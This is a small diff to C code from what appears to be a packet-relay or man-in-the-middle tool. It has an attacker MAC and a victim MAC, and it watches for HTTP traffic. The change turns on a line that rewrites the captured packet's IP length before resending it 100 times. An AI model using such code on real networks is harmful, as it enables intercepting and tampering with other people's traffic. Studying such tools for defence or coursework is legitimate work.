@@ -108,11 +108,11 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *victi
                     {
                         printf("http!\n");
                         copy_ip(infect_destip, ippkt->ip_dest);
+                        ippkt->ip_len = htons(0x0205);
                         for (int i = 0; i < 100; i++)
                         {
                             pcap_sendpacket(pcap, (u_char *)pkt, header->len);
                         }
-                        //         ippkt->ip_len = htons(0x0205);
                         //         copy_payload(modify, (char *)payload);
                     }
                 }
